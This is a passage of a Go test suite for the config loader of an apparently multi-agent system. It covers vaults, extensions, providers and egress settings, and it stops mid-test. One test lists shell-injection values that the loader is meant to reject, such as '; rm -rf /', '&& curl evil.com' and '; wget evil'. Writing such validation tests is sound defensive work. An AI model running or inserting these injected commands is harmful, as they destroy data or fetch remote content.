package config

import (
	"os"
	"path/filepath"
	"testing"
)

func writeYAML(t *testing.T, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "clem.yaml")
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("writing yaml: %v", err)
	}
	return path
}

func minYAML(caveman string) string {
	cavemanLine := ""
	if caveman != "" {
		cavemanLine = "\n    caveman: " + caveman
	}
	return `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"` + cavemanLine + "\n"
}

func TestCavemanLevel_StringLevels(t *testing.T) {
	cases := []struct {
		yaml    string
		want    CavemanLevel
		enabled bool
	}{
		{"lite", CavemanLite, true},
		{"full", CavemanFull, true},
		{"ultra", CavemanUltra, true},
		{"off", CavemanOff, false},
	}
	for _, tc := range cases {
		path := writeYAML(t, minYAML(tc.yaml))
		cfg, err := Load(path)
		if err != nil {
			t.Fatalf("caveman=%q: Load: %v", tc.yaml, err)
		}
		got := cfg.Agents["lead"].Caveman
		if got != tc.want {
			t.Errorf("caveman=%q: got %q, want %q", tc.yaml, got, tc.want)
		}
		if got.Enabled() != tc.enabled {
			t.Errorf("caveman=%q: Enabled()=%v, want %v", tc.yaml, got.Enabled(), tc.enabled)
		}
		if tc.enabled && got.Level() != tc.yaml {
			t.Errorf("caveman=%q: Level()=%q, want %q", tc.yaml, got.Level(), tc.yaml)
		}
	}
}

func TestCavemanLevel_LegacyBool(t *testing.T) {
	// true → ultra
	path := writeYAML(t, minYAML("true"))
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("caveman=true: Load: %v", err)
	}
	if got := cfg.Agents["lead"].Caveman; got != CavemanUltra {
		t.Errorf("caveman=true: got %q, want %q", got, CavemanUltra)
	}

	// false → off
	path = writeYAML(t, minYAML("false"))
	cfg, err = Load(path)
	if err != nil {
		t.Fatalf("caveman=false: Load: %v", err)
	}
	if got := cfg.Agents["lead"].Caveman; got != CavemanOff {
		t.Errorf("caveman=false: got %q, want %q", got, CavemanOff)
	}
}

func TestCavemanLevel_UnsetIsOff(t *testing.T) {
	path := writeYAML(t, minYAML(""))
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if cfg.Agents["lead"].Caveman.Enabled() {
		t.Error("expected caveman disabled when unset")
	}
}

func TestCavemanLevel_InvalidStringRejectsAtLoad(t *testing.T) {
	path := writeYAML(t, minYAML("maximum"))
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for invalid caveman value, got nil")
	}
}

// vaultServicesYAML builds a config with an agent-vault backend, the given
// services block, and one agent granted the "gw" vault.
func vaultServicesYAML(servicesBlock string) string {
	return `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
vault:
  backend: agent-vault
` + servicesBlock + `
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    vaults: [gw]
`
}

func TestLoad_VaultServices_ValidBearer(t *testing.T) {
	path := writeYAML(t, vaultServicesYAML(`  services:
    - name: gateway
      host: openrouter.ai
      auth_type: bearer
      token_key: OR_KEY`))
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("valid bearer service should load: %v", err)
	}
	if len(cfg.Vault.Services) != 1 || cfg.Vault.Services[0].TokenKey != "OR_KEY" {
		t.Errorf("service not parsed: %+v", cfg.Vault.Services)
	}
}

func TestLoad_VaultServices_InvalidAuthType(t *testing.T) {
	path := writeYAML(t, vaultServicesYAML(`  services:
    - name: gateway
      host: openrouter.ai
      auth_type: wat
      token_key: OR_KEY`))
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for invalid auth_type")
	}
}

func TestLoad_VaultServices_BearerMissingTokenKey(t *testing.T) {
	path := writeYAML(t, vaultServicesYAML(`  services:
    - name: gateway
      host: openrouter.ai
      auth_type: bearer`))
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for bearer without token_key")
	}
}

func TestLoad_VaultServices_BasicMissingPassword(t *testing.T) {
	path := writeYAML(t, vaultServicesYAML(`  services:
    - name: github
      host: github.com
      auth_type: basic
      username_key: U`))
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for basic without password_key")
	}
}

func TestLoad_VaultServices_BadNameSlug(t *testing.T) {
	path := writeYAML(t, vaultServicesYAML(`  services:
    - name: "Bad Name"
      host: openrouter.ai
      auth_type: bearer
      token_key: OR_KEY`))
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for invalid service name slug")
	}
}

func TestLoad_VaultServices_RequiresAgentVaultBackend(t *testing.T) {
	// Same services but backend left at default (env).
	y := `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
vault:
  services:
    - name: gateway
      host: openrouter.ai
      auth_type: bearer
      token_key: OR_KEY
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    vaults: [gw]
`
	if _, err := Load(writeYAML(t, y)); err == nil {
		t.Fatal("expected error: vault.services without agent-vault backend")
	}
}

func TestLoad_PrimaryMilestoneParsed(t *testing.T) {
	path := writeYAML(t, `
project: myteam
primary_milestone: "Ship v1 by 2027-01-01"
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g", tasks: "t"}
operator:
  discord_ids: ["277434478803156993"]
agents:
  lead:
    name: "Amara"
    role: "Lead"
    model: "claude-sonnet-4-6"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if cfg.PrimaryMilestone != "Ship v1 by 2027-01-01" {
		t.Errorf("PrimaryMilestone = %q", cfg.PrimaryMilestone)
	}
}

func TestLoad_PrimaryMilestoneOptional(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
agents:
  lead:
    name: "Amara"
    model: "claude-sonnet-4-6"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if cfg.PrimaryMilestone != "" {
		t.Errorf("PrimaryMilestone = %q, want empty", cfg.PrimaryMilestone)
	}
}

func subagentYAML(subagentModel string) string {
	line := ""
	if subagentModel != "" {
		line = "\n    subagent_model: " + subagentModel
	}
	return `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
agents:
  lead:
    name: "Lead"
    model: "claude-opus-4-7"` + line + "\n"
}

func TestLoad_SubagentModelDefaultsWhenUnset(t *testing.T) {
	path := writeYAML(t, subagentYAML(""))
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if got := cfg.Agents["lead"].SubagentModel; got != DefaultSubagentModel {
		t.Errorf("SubagentModel = %q, want %q", got, DefaultSubagentModel)
	}
}

func TestLoad_SubagentModelExplicitValuePreserved(t *testing.T) {
	path := writeYAML(t, subagentYAML(`"claude-haiku-4-5-20251001"`))
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if got := cfg.Agents["lead"].SubagentModel; got != "claude-haiku-4-5-20251001" {
		t.Errorf("SubagentModel = %q, want %q", got, "claude-haiku-4-5-20251001")
	}
}

func TestLoad_SubagentModelOffDisables(t *testing.T) {
	path := writeYAML(t, subagentYAML("off"))
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if got := cfg.Agents["lead"].SubagentModel; got != "" {
		t.Errorf("SubagentModel = %q, want empty (disabled)", got)
	}
}

func TestLoad_SubagentModelNoDefaultForOllama(t *testing.T) {
	yaml := `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
agents:
  lead:
    name: "Lead"
    model: "llama3"
    provider: ollama
    provider_url: "http://localhost:11434"
`
	path := writeYAML(t, yaml)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if got := cfg.Agents["lead"].SubagentModel; got != "" {
		t.Errorf("SubagentModel = %q, want empty (ollama cannot use CLAUDE_CODE_SUBAGENT_MODEL)", got)
	}
}

func TestLoad_SubagentModelDefaultsForBedrock(t *testing.T) {
	yaml := `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
agents:
  lead:
    name: "Lead"
    model: "claude-opus-4-7"
    provider: bedrock
`
	path := writeYAML(t, yaml)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if got := cfg.Agents["lead"].SubagentModel; got != DefaultSubagentModel {
		t.Errorf("SubagentModel = %q, want %q (bedrock is Anthropic-backed)", got, DefaultSubagentModel)
	}
}

func TestLoad_GitIdentityParsed(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
agents:
  lead:
    name: "Ada"
    model: "claude-sonnet-4-6"
    git_name: "clauderesearch"
    git_email: "212849679+clauderesearch@users.noreply.github.com"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	ac := cfg.Agents["lead"]
	if ac.GitName != "clauderesearch" {
		t.Errorf("GitName = %q, want %q", ac.GitName, "clauderesearch")
	}
	if ac.GitEmail != "212849679+clauderesearch@users.noreply.github.com" {
		t.Errorf("GitEmail = %q, want %q", ac.GitEmail, "212849679+clauderesearch@users.noreply.github.com")
	}
}

func TestLoad_GitIdentityOptional(t *testing.T) {
	path := writeYAML(t, minYAML(""))
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	ac := cfg.Agents["lead"]
	if ac.GitName != "" || ac.GitEmail != "" {
		t.Errorf("expected empty git identity when unset, got name=%q email=%q", ac.GitName, ac.GitEmail)
	}
}

func TestLoad_OperatorParsed(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993"]
  github_logins: ["jahwag"]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(cfg.Operator.DiscordIDs) != 1 || cfg.Operator.DiscordIDs[0] != "277434478803156993" {
		t.Errorf("DiscordIDs = %v, want [277434478803156993]", cfg.Operator.DiscordIDs)
	}
	if len(cfg.Operator.GitHubLogins) != 1 || cfg.Operator.GitHubLogins[0] != "jahwag" {
		t.Errorf("GitHubLogins = %v, want [jahwag]", cfg.Operator.GitHubLogins)
	}
}

func TestLoad_OperatorMultiParsed(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["277434478803156993", "123456789012345678"]
  github_logins: ["jahwag", "clauderesearch"]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(cfg.Operator.DiscordIDs) != 2 {
		t.Errorf("DiscordIDs len = %d, want 2", len(cfg.Operator.DiscordIDs))
	}
	if len(cfg.Operator.GitHubLogins) != 2 {
		t.Errorf("GitHubLogins len = %d, want 2", len(cfg.Operator.GitHubLogins))
	}
}

func TestLoad_OperatorInvalidSnowflakeTooShort(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["1234"]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for too-short snowflake, got nil")
	}
}

func TestLoad_OperatorInvalidSnowflakeNonNumeric(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  discord_ids: ["abc12345678901234"]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for non-numeric snowflake, got nil")
	}
}

func TestLoad_OperatorInvalidLoginSpecialChars(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  github_logins: ["bad login!"]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for login with special chars, got nil")
	}
}

func TestLoad_OperatorInvalidLoginTooLong(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
operator:
  github_logins: ["this-login-is-way-too-long-exceeds-39-chars-limit"]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for login exceeding 39 chars, got nil")
	}
}

func TestLoad_OperatorAbsentAllowed(t *testing.T) {
	// Operator block is optional; absent block must not cause Load to fail.
	path := writeYAML(t, `
project: myteam
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(cfg.Operator.DiscordIDs) != 0 || len(cfg.Operator.GitHubLogins) != 0 {
		t.Errorf("expected empty operator when unset, got %+v", cfg.Operator)
	}
}
func TestLoad_ExtensionsParsed(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    vaults: [github, discord-lead]
    extensions:
      marketplaces:
        - name: caveman
          source: github
          repo: JuliusBrussee/caveman
      plugins:
        - caveman@caveman
      skills:
        - name: security
          source: github
          repo: anthropics/skills
          path: skills/security-pre-commit
      mcp_servers:
        - name: context7
          url: https://mcp.context7.com/mcp
        - name: discord
          command: npx
          args: ["-y", "@some/discord-mcp"]
          env:
            DISCORD_TOKEN: "${vault:discord-lead.DISCORD_TOKEN}"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	ext := cfg.Agents["lead"].Extensions
	if len(ext.Marketplaces) != 1 || ext.Marketplaces[0].Name != "caveman" {
		t.Errorf("marketplaces: got %v", ext.Marketplaces)
	}
	if len(ext.Plugins) != 1 || ext.Plugins[0].Name != "caveman" || ext.Plugins[0].Marketplace != "caveman" {
		t.Errorf("plugins: got %v", ext.Plugins)
	}
	if len(ext.Skills) != 1 || ext.Skills[0].Name != "security" || ext.Skills[0].Path != "skills/security-pre-commit" {
		t.Errorf("skills: got %v", ext.Skills)
	}
	if len(ext.MCPServers) != 2 {
		t.Fatalf("mcp_servers: want 2, got %d", len(ext.MCPServers))
	}
	sse := ext.MCPServers[0]
	if sse.Name != "context7" || sse.URL != "https://mcp.context7.com/mcp" {
		t.Errorf("mcp_server[0]: got %+v", sse)
	}
	disc := ext.MCPServers[1]
	if disc.Name != "discord" || disc.Command != "npx" {
		t.Errorf("mcp_server[1]: got %+v", disc)
	}
	if disc.Env["DISCORD_TOKEN"] != "${vault:discord-lead.DISCORD_TOKEN}" {
		t.Errorf("vault ref should be preserved in config, got %q", disc.Env["DISCORD_TOKEN"])
	}
}

func TestLoad_ExtensionsMissingVaultRejectsAtLoad(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    vaults: [github]
    extensions:
      mcp_servers:
        - name: discord
          command: npx
          env:
            DISCORD_TOKEN: "${vault:discord-lead.DISCORD_TOKEN}"
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for vault ref to unlisted vault, got nil")
	}
}

func TestLoad_ExtensionsMCPMissingCommandAndURL(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    extensions:
      mcp_servers:
        - name: broken
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for mcp_server with no command or url, got nil")
	}
}

func TestLoad_ExtensionsRejectShellInjection(t *testing.T) {
	header := `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    extensions:
`
	cases := []struct {
		name string
		ext  string
	}{
		{"marketplace name with semicolon", `
      marketplaces:
        - name: "caveman; touch /tmp/injected"
          source: github
          repo: JuliusBrussee/caveman
`},
		{"marketplace name with space", `
      marketplaces:
        - name: "caveman mode"
          source: github
          repo: JuliusBrussee/caveman
`},
		{"marketplace repo with semicolon", `
      marketplaces:
        - name: caveman
          source: github
          repo: "JuliusBrussee/caveman; touch /tmp/x"
`},
		{"marketplace repo missing slash", `
      marketplaces:
        - name: caveman
          source: github
          repo: "notarepo"
`},
		{"marketplace commit non-hex", `
      marketplaces:
        - name: caveman
          source: github
          repo: JuliusBrussee/caveman
          commit: "abc; rm -rf /"
`},
		{"skill name with backtick", `
      skills:
        - name: "skill` + "`" + `bad"
          source: github
          repo: anthropics/skills
`},
		{"skill repo with injection", `
      skills:
        - name: security
          source: github
          repo: "anthropics/skills && curl evil.com"
`},
		{"plugin name with semicolon", `
      plugins:
        - name: "bad;plugin"
          marketplace: caveman
`},
		{"plugin marketplace with injection", `
      plugins:
        - name: caveman
          marketplace: "caveman; wget evil"
`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			path := writeYAML(t, header+tc.ext)
			_, err := Load(path)
			if err == nil {
				t.Fatalf("expected validation error for %q, got nil", tc.name)
			}
		})
	}
}

func TestExpandVaultRefs(t *testing.T) {
	secrets := map[string]string{
		"discord-lead.DISCORD_TOKEN": "tok123",
		"github.GH_TOKEN":            "ghp_abc",
	}
	cases := []struct {
		in   string
		want string
	}{
		{"${vault:discord-lead.DISCORD_TOKEN}", "tok123"},
		{"${vault:github.GH_TOKEN}", "ghp_abc"},
		{"prefix-${vault:discord-lead.DISCORD_TOKEN}-suffix", "prefix-tok123-suffix"},
		{"${vault:other.MISSING}", "${vault:other.MISSING}"},
		{"no refs here", "no refs here"},
	}
	for _, tc := range cases {
		if got := ExpandVaultRefs(tc.in, secrets); got != tc.want {
			t.Errorf("ExpandVaultRefs(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestExpandVaultRefs_KeyCollision(t *testing.T) {
	// Two vaults share the same key name; ExpandVaultRefs must resolve each ref
	// to its correct vault rather than silently delivering the wrong value.
	secrets := map[string]string{
		"github.API_KEY": "github-token",
		"openai.API_KEY": "openai-token",
	}
	cases := []struct {
		in   string
		want string
	}{
		{"${vault:github.API_KEY}", "github-token"},
		{"${vault:openai.API_KEY}", "openai-token"},
		{"${vault:other.API_KEY}", "${vault:other.API_KEY}"},
	}
	for _, tc := range cases {
		if got := ExpandVaultRefs(tc.in, secrets); got != tc.want {
			t.Errorf("ExpandVaultRefs(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestPluginConfig_ShorthandUnmarshal(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    extensions:
      plugins:
        - caveman@caveman
        - name: pr-review
          marketplace: toolkit
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	plugins := cfg.Agents["lead"].Extensions.Plugins
	if len(plugins) != 2 {
		t.Fatalf("want 2 plugins, got %d", len(plugins))
	}
	if plugins[0].Name != "caveman" || plugins[0].Marketplace != "caveman" {
		t.Errorf("plugin[0]: got %+v", plugins[0])
	}
	if plugins[1].Name != "pr-review" || plugins[1].Marketplace != "toolkit" {
		t.Errorf("plugin[1]: got %+v", plugins[1])
	}
}

func TestLoad_EffortValidValues(t *testing.T) {
	for _, effort := range []string{"", "low", "medium", "high", "xhigh", "max"} {
		yaml := `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    effort: ` + effort + "\n"
		if effort == "" {
			yaml = `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`
		}
		path := writeYAML(t, yaml)
		if _, err := Load(path); err != nil {
			t.Errorf("effort=%q: unexpected error: %v", effort, err)
		}
	}
}

func TestLoad_EffortInvalidRejects(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    effort: hight
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for invalid effort value, got nil")
	}
}

func TestLoad_ProviderUnknownRejectsAtLoad(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  worker:
    name: "Worker"
    model: "claude-sonnet-4-6"
    provider: olaama
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for unknown provider, got nil")
	}
}

func TestLoad_ProviderOllamaMissingURLRejectsAtLoad(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  worker:
    name: "Worker"
    model: "llama3"
    provider: ollama
`)
	_, err := Load(path)
	if err == nil {
		t.Fatal("expected error for ollama missing provider_url, got nil")
	}
}

func TestLoad_ProviderOllamaWithURLAccepted(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  worker:
    name: "Worker"
    model: "llama3"
    provider: ollama
    provider_url: "http://localhost:11434"
`)
	if _, err := Load(path); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}


func TestLoad_EgressParsed(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
egress:
  enabled: true
  posture: strict
  proxy_port: 9000
  proxy_user: clem-proxy
  domains:
    - "*.anthropic.com"
    - github.com
  allow_localhost_ports: [11434]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if !cfg.Egress.Enabled {
		t.Error("egress.enabled not parsed")
	}
	if cfg.Egress.Posture != "strict" {
		t.Errorf("posture=%q, want strict", cfg.Egress.Posture)
	}
	if cfg.Egress.ProxyPortOrDefault() != 9000 {
		t.Errorf("proxy_port=%d, want 9000", cfg.Egress.ProxyPortOrDefault())
	}
	if len(cfg.Egress.Domains) != 2 {
		t.Errorf("domains=%v, want 2 entries", cfg.Egress.Domains)
	}
	if !cfg.EgressEnabledFor("lead") {
		t.Error("EgressEnabledFor(lead) = false, want true")
	}
}

func TestEgress_Defaults(t *testing.T) {
	var e EgressConfig
	if e.PostureOrDefault() != "balanced" {
		t.Errorf("PostureOrDefault=%q, want balanced", e.PostureOrDefault())
	}
	if e.ProxyPortOrDefault() != 8888 {
		t.Errorf("ProxyPortOrDefault=%d, want 8888", e.ProxyPortOrDefault())
	}
	if e.ProxyUserOrDefault() != "clem-proxy" {
		t.Errorf("ProxyUserOrDefault=%q, want clem-proxy", e.ProxyUserOrDefault())
	}
}

func TestEgressEnabledFor_PerAgentOverride(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
egress:
  enabled: true
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
  loner:
    name: "Loner"
    model: "claude-sonnet-4-6"
    egress: false
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if !cfg.EgressEnabledFor("lead") {
		t.Error("lead should inherit enabled=true")
	}
	if cfg.EgressEnabledFor("loner") {
		t.Error("loner overrode egress: false, should be disabled")
	}
}

func TestEgressEnabledFor_DeprecatedFlagOptsIn(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    egress_restriction_experimental: true
  worker:
    name: "Worker"
    model: "claude-sonnet-4-6"
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if !cfg.EgressEnabledFor("lead") {
		t.Error("deprecated egress_restriction_experimental should opt lead in")
	}
	if cfg.EgressEnabledFor("worker") {
		t.Error("worker without flag and no top-level egress should be disabled")
	}
}

func TestLoad_EgressInvalidPostureRejects(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
egress:
  enabled: true
  posture: paranoid
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for invalid posture, got nil")
	}
}

func TestLoad_EgressProxyPortCollidesWithWebTerminal(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
egress:
  enabled: true
  proxy_port: 7681
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    web_terminal_port: 7681
`)
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for proxy_port colliding with web_terminal_port, got nil")
	}
}

func TestLoad_EgressProxyPortOutOfRange(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
egress:
  enabled: true
  proxy_port: 80
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for proxy_port < 1024, got nil")
	}
}

func TestLoad_EgressAllowLocalhostPortOutOfRange(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
egress:
  enabled: true
  allow_localhost_ports: [0]
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for allow_localhost_ports out of range, got nil")
	}
}

func TestLoad_VaultBackendParsed(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
vault:
  backend: agent-vault
  system_user: clem-vault
  addr: http://127.0.0.1:14321
  proxy_host: 127.0.0.1:14322
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    vaults: [anthropic, slack]
    vault_broker: true
    brokered_secrets: [ANTHROPIC_API_KEY, SLACK_MCP_XOXP_TOKEN]
`)
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if !cfg.Vault.IsAgentVault() {
		t.Error("backend not parsed as agent-vault")
	}
	if cfg.Vault.ProxyHostOrDefault() != "127.0.0.1:14322" {
		t.Errorf("proxy_host=%q", cfg.Vault.ProxyHostOrDefault())
	}
	lead := cfg.Agents["lead"]
	if !lead.IsBrokered("ANTHROPIC_API_KEY") {
		t.Error("ANTHROPIC_API_KEY should be brokered")
	}
	if lead.IsBrokered("DISCORD_TOKEN") {
		t.Error("DISCORD_TOKEN not listed → not brokered")
	}
}

func TestVaultBackend_Defaults(t *testing.T) {
	var v VaultBackend
	if v.IsAgentVault() {
		t.Error("empty backend should not be agent-vault")
	}
	if v.SystemUserOrDefault() != "clem-vault" {
		t.Errorf("system_user default=%q", v.SystemUserOrDefault())
	}
	if v.AddrOrDefault() != "http://127.0.0.1:14321" {
		t.Errorf("addr default=%q", v.AddrOrDefault())
	}
	if v.CACertPathOrDefault() != "/etc/clem/agent-vault-ca.pem" {
		t.Errorf("ca default=%q", v.CACertPathOrDefault())
	}
}

func TestIsBrokered_FalseWhenBrokerDisabled(t *testing.T) {
	ac := AgentConfig{VaultBroker: false, BrokeredSecrets: []string{"ANTHROPIC_API_KEY"}}
	if ac.IsBrokered("ANTHROPIC_API_KEY") {
		t.Error("IsBrokered must be false when vault_broker is off")
	}
}

func TestLoad_VaultBrokerRequiresAgentVaultBackend(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    vault_broker: true
    brokered_secrets: [ANTHROPIC_API_KEY]
`)
	if _, err := Load(path); err == nil {
		t.Fatal("expected error: vault_broker without agent-vault backend")
	}
}

func TestLoad_BrokeringDiscordTokenRejected(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
vault:
  backend: agent-vault
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
    vault_broker: true
    brokered_secrets: [DISCORD_TOKEN]
`)
	if _, err := Load(path); err == nil {
		t.Fatal("expected error: DISCORD_TOKEN is unbrokerable")
	}
}

func TestLoad_UnknownVaultBackendRejected(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
vault:
  backend: hashicorp
agents:
  lead:
    name: "Lead"
    model: "claude-sonnet-4-6"
`)
	if _, err := Load(path); err == nil {
		t.Fatal("expected error for unknown vault backend")
	}
}

func TestLoad_VaultBrokerAndEgressMutuallyExclusive(t *testing.T) {
	path := writeYAML(t, `
project: myteam
coordination:
  backend: discord
  server_id: "1"
  channels: {general: "g"}
egress:
  enabled: true
vault:
  backend: agent-vault
agents:
  lead:
